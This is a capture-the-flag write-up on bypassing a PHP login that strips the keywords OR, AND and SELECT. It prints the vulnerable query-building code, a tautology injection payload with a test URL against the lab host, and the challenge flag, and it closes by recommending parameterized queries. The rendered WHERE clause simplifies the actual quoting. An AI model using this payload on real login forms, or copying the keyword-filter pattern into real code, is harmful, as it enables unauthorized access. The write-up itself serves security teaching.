# SQL Injection Challenge Write-up

## Hint: Do you view the sauce?

While exploring the target, you navigate to `login.php` and inspect the page source. There, you find an interesting HTML comment:

```
<!-- Add ?source to show the source! -->
```

Following this hint, you append `?source` to the URL:

```
/login.php?source
```

This reveals the PHP source code of the page, exposing the backend logic handling user inputs.

---

## Source Code Analysis

```
// Delete keywords to prevent SQL injection!
$email = str_ireplace("OR", "", $_GET["email"]);
$email = str_ireplace("AND", "", $email);
$email = str_ireplace("SELECT", "", $email);

$pass = str_ireplace("OR", "", $_GET["password"]);
$pass = str_ireplace("AND", "", $pass);
$pass = str_ireplace("SELECT", "", $pass);

$sql = "SELECT email, password FROM users WHERE email = '{$email}' and password = '{$pass}'";
```

The application attempts to prevent SQL injection by removing the keywords `OR`, `AND`, and `SELECT` from user input.

---

## Exploiting the Injection

Even though `OR`, `AND`, and `SELECT` are filtered out, other SQL expressions remain usable.

One such payload is:

```
email=''=''&password=''=''
```

This effectively injects tautologies in the conditions, resulting in an always-true logic:

```
WHERE email = ''='' AND password = ''=''
```

Since the comparison `' ' = ' '` is always true, this bypasses authentication despite the filtering.

You can test it using:

```https://skrctf.me/ports/xxx/login.php?email=''=''&password=''=''```

---

## Flag

```
SKR{I_Sh0uld_3sc4p3_s1ngle_qu0te_0bb479}
```

---

## Conclusion

This challenge demonstrates that simple keyword filtering (`OR`, `AND`, `SELECT`) is insufficient to prevent SQL injection. Logical tautologies such as `''=''` can still be used to bypass login checks. Proper input sanitization and use of parameterized queries are essential for security.
